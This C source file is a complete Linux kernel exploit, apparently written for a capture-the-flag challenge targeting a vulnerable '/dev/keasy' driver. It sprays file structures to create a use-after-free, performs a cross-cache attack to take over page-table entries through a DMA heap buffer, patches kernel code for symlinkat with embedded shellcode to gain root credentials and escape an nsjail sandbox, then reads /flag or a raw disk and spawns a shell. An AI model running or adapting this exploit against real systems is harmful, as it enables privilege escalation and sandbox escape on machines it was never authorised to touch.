#define _GNU_SOURCE 
#include<stdio.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include <stdlib.h>
#include <string.h>
#include<unistd.h>
#include<sys/mman.h>
#include<signal.h>
#include<pthread.h>
#include<linux/userfaultfd.h>
#include <sys/ioctl.h>
#include<syscall.h>
#include<poll.h>
#include <semaphore.h>
#include <sched.h>

#pragma pack(16)
#define __int64 long long
#define CLOSE printf("\033[0m\n");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");
#define YELLOW printf("\033[33m");
#define _QWORD unsigned long
#define _DWORD unsigned int
#define _WORD unsigned short
#define _BYTE unsigned char
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_BLUE "\033[34m"
#define COLOR_DEFAULT "\033[0m"
#define showAddr(var)  dprintf(2, COLOR_GREEN "[*] %s -> %p\n" COLOR_DEFAULT, #var, var); 
#define logd(fmt, ...) dprintf(2, COLOR_BLUE "[*] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)
#define debug(fmt, ...)                      \
    do {                                     \
        loge(fmt, ##__VA_ARGS__);            \
        loge("debug at line %d", __LINE__);  \
        getchar();                           \
    } while (0)
   

size_t raw_vmlinux_base = 0xffffffff81000000;
size_t raw_direct_base=0xffff888000000000;
size_t commit_creds = 0,prepare_kernel_cred = 0;
size_t vmlinux_base = 0;
size_t swapgs_restore_regs_and_return_to_usermode=0;
size_t user_cs, user_ss, user_rflags, user_sp;
size_t init_cred=0;
size_t __ksymtab_commit_creds=0,__ksymtab_prepare_kernel_cred=0;
void save_status();
size_t find_symbols();
void _showAddr(char*name,size_t data);
void getshell(void);
size_t cvegetbase();
void bind_cpu(int core);

int dev_fd;
int dma_fd;
const char* FileAttack="/dev/keasy\0";

#define SPRAY_FILE_COUNT 0x100
#define SPRAY_PAGE_COUNT 0x200
#define  DMA_HEAP_IOCTL_ALLOC 0xc0184800
int spray_fd[SPRAY_FILE_COUNT];
void* spray_page[SPRAY_PAGE_COUNT];

typedef unsigned long long u64;
typedef unsigned int u32;
struct dma_heap_allocation_data {
  u64 len;
  u32 fd;
  u32 fd_flags;
  u64 heap_flags;
};

static void win() {
  char buf[0x100];
  int fd = open("/dev/sda", O_RDONLY);
  if (fd < 0) {
    puts("[-] Lose...");
  } else {
    puts("[+] Win!");
    read(fd, buf, 0x100);
    write(1, buf, 0x100);
    puts("[+] Done");
    pause();
  }
  exit(0);
}


int main(void){
   save_status();
   BLUE;puts("[*]start");CLOSE;
   dev_fd = open(FileAttack,2);
    if(dev_fd < 0){
        die("open failed");
    }
    dma_fd=open("/dev/dma_heap/system",0);
    if(dma_fd<0){
        die("open failed dma");
    }
    bind_cpu(0);

    int fd_sp=0;
    int uaf_fd=-1;

    puts("spray page standby after fill ptes");
     for (size_t i = 0; i < SPRAY_PAGE_COUNT; i++)
    {
        spray_page[i]=mmap((0xdead0000UL + i*(0x10000UL)),0x8000,
                            PROT_READ|PROT_WRITE,
                            MAP_ANONYMOUS|MAP_SHARED,
                            -1,0);
    }

    puts("== STEP 1 ==");
    logi("spray filp struct && make uaf object");

    for (size_t i = 0; i < SPRAY_FILE_COUNT; i++)
    {
        if(i==SPRAY_FILE_COUNT/2){
            uaf_fd=spray_fd[fd_sp-1];
            uaf_fd++;
            ioctl(dev_fd,0,0xdeadbeef);
        }
       spray_fd[fd_sp++]=open("/",O_RDONLY);
    }

    puts("== STEP 2 ==");
    logi("free filp struct to construct Cross Cache Attack");

    for (int i = 0; i < SPRAY_FILE_COUNT; i++){
        if(spray_fd[i])close(spray_fd[i]);
    }
    puts("== STEP 3 ==");
    logi("spray PTEs to fill the uaf filp objects");

    struct dma_heap_allocation_data dmas={0};
    dmas.len=0x1000;
    dmas.fd_flags=2;

    for (size_t i = 0; i < SPRAY_PAGE_COUNT; i++)
    {
        if(i==SPRAY_PAGE_COUNT/2){
             int f=ioctl(dma_fd,DMA_HEAP_IOCTL_ALLOC,&dmas);
             if(f<0) die("DMA_HEAP_IOCTL_ALLOC");
        }
        for (size_t j = 0; j < 8; j++)
        {
           *(char*)(spray_page[i]+j*0x1000)= 'A'+j;
        }
    }


    puts("== STEP 4 ==");
    logi("hijack pte");    

    for (size_t i = 0; i < 0x1000; i++)
    {
        dup(uaf_fd);
    }

    puts("== STEP 5 ==");
    logi("find uaf object for pte");    
    char* hijack_p =NULL;
    for (size_t i = 0; i < SPRAY_PAGE_COUNT; i++)
    {
        if(*(char*)(spray_page[i]+7*0x1000)!='A'+7){
            hijack_p=(char*)(spray_page[i]+7*0x1000);
            printf("mmap fd -> %d th\n",i);
            printf("found page addr -> %p\n",hijack_p);
            break;
        }
    }
    if(hijack_p==NULL)die("not found");

    puts("== STEP 5 ==");
    logi("try to change pte's page");
    showAddr(hijack_p);
    munmap(hijack_p,0x1000);

    char* dma_buf = (char*)mmap(hijack_p,0x1000,PROT_WRITE|PROT_READ,
                                MAP_POPULATE|MAP_SHARED,dmas.fd,0);

    //需要立即分配物理页面 MAP_POPULATE
    size_t* ldma_buf = (size_t*)dma_buf;
    dma_buf[0]='a';
    logw("dma buf content %p",*ldma_buf);

     for (size_t i = 0; i < 0x1000; i++)
    {
        dup(uaf_fd);
    }
    if(*ldma_buf<0xff)die("pte dup failed");
    logw("after dup dma buf content  %p",*ldma_buf);
    *ldma_buf=0x800000000009c067;


    size_t * hijack_pte =NULL;
    for (size_t i = 0; i < SPRAY_PAGE_COUNT; i++)
    {
        // printf("%d -> %p %p\n",i,*(size_t*)spray_page[i],spray_page[i]);
        if(*(char*)spray_page[i]!='A'){
            hijack_pte=spray_page[i];
            logd("leak base success");
            break;
        }
    }
    if(hijack_pte==NULL)die("leak base failed");
    
    size_t physical_addr= *hijack_pte & (~0xfff);
    size_t physical_base=physical_addr-0x1c04000;
    showAddr(physical_base);

    puts("== STEP 6 ==");
    logi("Escaping from nsjail");
    char shellcode[] = {
        0xf3, 0x0f, 0x1e, 0xfa, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x5f, 0x49, 0x81, 0xef, 0xc9,
        0xd4, 0x24, 0x00, 0x49, 0x8d, 0xbf, 0xd8, 0x5e, 0x44, 0x01, 0x49, 0x8d, 0x87, 0x20, 0xe6,
        0x0a, 0x00, 0xff, 0xd0, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x49, 0x8d, 0x87, 0x50, 0x37, 0x0a,
        0x00, 0xff, 0xd0, 0x48, 0x89, 0xc7, 0x49, 0x8d, 0xb7, 0xe0, 0x5c, 0x44, 0x01, 0x49, 0x8d,
        0x87, 0x40, 0xc1, 0x0a, 0x00, 0xff, 0xd0, 0x49, 0x8d, 0xbf, 0x48, 0x82, 0x53, 0x01, 0x49,
        0x8d, 0x87, 0x90, 0xf8, 0x27, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc3, 0x48, 0xbf, 0x11, 0x11,
        0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x49, 0x8d, 0x87, 0x50, 0x37, 0x0a, 0x00, 0xff, 0xd0,
        0x48, 0x89, 0x98, 0x40, 0x07, 0x00, 0x00, 0x31, 0xc0, 0x48, 0x89, 0x04, 0x24, 0x48, 0x89,
        0x44, 0x24, 0x08, 0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x48, 0x89,
        0x44, 0x24, 0x10, 0x48, 0xb8, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x48, 0x89,
        0x44, 0x24, 0x18, 0x48, 0xb8, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x48, 0x89,
        0x44, 0x24, 0x20, 0x48, 0xb8, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x48, 0x89,
        0x44, 0x24, 0x28, 0x48, 0xb8, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x48, 0x89,
        0x44, 0x24, 0x30, 0x49, 0x8d, 0x87, 0x41, 0x0f, 0xc0, 0x00, 0xff, 0xe0, 0xcc };
    void *p;
    p = memmem(shellcode, sizeof(shellcode), "\x11\x11\x11\x11\x11\x11\x11\x11", 8);
    *(size_t*)p = getpid();
    p = memmem(shellcode, sizeof(shellcode), "\x22\x22\x22\x22\x22\x22\x22\x22", 8);
    *(size_t*)p = (size_t)&win;
    p = memmem(shellcode, sizeof(shellcode), "\x33\x33\x33\x33\x33\x33\x33\x33", 8);
    *(size_t*)p = user_cs;
    p = memmem(shellcode, sizeof(shellcode), "\x44\x44\x44\x44\x44\x44\x44\x44", 8);
    *(size_t*)p = user_rflags;
    p = memmem(shellcode, sizeof(shellcode), "\x55\x55\x55\x55\x55\x55\x55\x55", 8);
    *(size_t*)p = user_sp;
    p = memmem(shellcode, sizeof(shellcode), "\x66\x66\x66\x66\x66\x66\x66\x66", 8);
    *(size_t*)p = user_ss;

    size_t physical_symlinkat= physical_base + 0x24d4c0;
    *ldma_buf= (physical_symlinkat&(~0xfff)) | 0x8000000000000067;
    showAddr(*ldma_buf);
    memcpy(((char*)hijack_pte) + ( physical_symlinkat & 0xfff), shellcode, sizeof(shellcode));

    printf("%d\n", symlink("/jail/x", "/jail"));

    // debug("pause");
    

   BLUE;puts("[*]end");CLOSE;
   return 0;
}


void save_status(){
   __asm__("mov user_cs,cs;"
           "pushf;" //push eflags
           "pop user_rflags;"
           "mov user_sp,rsp;"
           "mov user_ss,ss;"
          );
    
    puts("\033[34mUser land saved.\033[0m");
    printf("\033[34muser_ss:0x%llx\033[0m\n", user_ss);
    printf("\033[34muser_sp:0x%llx\033[0m\n", user_sp);
    printf("\033[34muser_rflags:0x%llx\033[0m\n", user_rflags);
    printf("\033[34muser_cs:0x%llx\033[0m\n", user_cs);
    
}

void binary_dump(char *desc, void *addr, int len) {
    _QWORD *buf64 = (_QWORD *) addr;
    _BYTE *buf8 = (_BYTE *) addr;
    if (desc != NULL) {
        printf("\033[33m[*] %s:\n\033[0m", desc);
    }
    for (int i = 0; i < len / 8; i += 4) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 4; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 32 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}


void bind_cpu(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
    BLUE;printf("[*] bind_cpu(%d)",core);CLOSE;
}
void getshell(void)
{   
    BLUE;printf("[*]Successful");CLOSE;
    char flag[0x100] = { 0 };
    int flagfd = open("/flag", O_RDONLY);
    read(flagfd, flag, 0x100);
    write(1, flag, 0x100);
    system("/bin/sh");
}



